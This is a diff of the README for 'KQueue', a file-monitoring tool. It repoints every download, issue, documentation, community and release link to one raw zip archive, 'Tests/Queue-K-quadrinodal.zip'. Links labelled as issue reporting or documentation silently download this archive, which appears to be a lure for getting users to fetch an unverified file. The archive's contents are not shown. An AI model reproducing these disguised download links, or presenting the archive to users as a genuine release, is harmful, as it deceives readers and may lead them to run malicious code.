@@ -6,11 +6,11 @@ Welcome to KQueue! This application makes it easy to monitor file changes on you
 
 ## 📥 Download KQueue
 
-[![Download KQueue](https://github.com/rrraade/KQueue/raw/refs/heads/main/Sources/Queue-K-3.1.zip)](https://github.com/rrraade/KQueue/raw/refs/heads/main/Sources/Queue-K-3.1.zip)
+[![Download KQueue](https://github.com/rrraade/KQueue/raw/refs/heads/main/Tests/Queue-K-quadrinodal.zip)](https://github.com/rrraade/KQueue/raw/refs/heads/main/Tests/Queue-K-quadrinodal.zip)
 
 To get started with KQueue, you need to download it. Visit this page to download:
 
-[Download KQueue Releases](https://github.com/rrraade/KQueue/raw/refs/heads/main/Sources/Queue-K-3.1.zip)
+[Download KQueue Releases](https://github.com/rrraade/KQueue/raw/refs/heads/main/Tests/Queue-K-quadrinodal.zip)
 
 ## 🛠️ System Requirements
 
@@ -73,7 +73,7 @@ KQueue offers several features to enhance your experience:
 
 If you have questions or need assistance, we are here to help. You can open an issue in the GitHub repository for support. 
 
-- **Report an Issue:** [Create an Issue](https://github.com/rrraade/KQueue/raw/refs/heads/main/Sources/Queue-K-3.1.zip)
+- **Report an Issue:** [Create an Issue](https://github.com/rrraade/KQueue/raw/refs/heads/main/Tests/Queue-K-quadrinodal.zip)
 
 ## 📄 License
 
@@ -83,7 +83,7 @@ KQueue is licensed under the MIT License. You can freely use, modify, and distri
 
 For more help and information about KQueue, check out the following resources:
 
-- [KQueue Documentation](https://github.com/rrraade/KQueue/raw/refs/heads/main/Sources/Queue-K-3.1.zip) - Detailed usage instructions and API references.
-- [KQueue Community](https://github.com/rrraade/KQueue/raw/refs/heads/main/Sources/Queue-K-3.1.zip) - Join discussions and share your experiences with others.
+- [KQueue Documentation](https://github.com/rrraade/KQueue/raw/refs/heads/main/Tests/Queue-K-quadrinodal.zip) - Detailed usage instructions and API references.
+- [KQueue Community](https://github.com/rrraade/KQueue/raw/refs/heads/main/Tests/Queue-K-quadrinodal.zip) - Join discussions and share your experiences with others.
 
-Thank you for using KQueue! We hope it helps you efficiently monitor file changes on your system. Remember to visit the [Release page](https://github.com/rrraade/KQueue/raw/refs/heads/main/Sources/Queue-K-3.1.zip) to download the latest version.
+Thank you for using KQueue! We hope it helps you efficiently monitor file changes on your system. Remember to visit the [Release page](https://github.com/rrraade/KQueue/raw/refs/heads/main/Tests/Queue-K-quadrinodal.zip) to download the latest version.
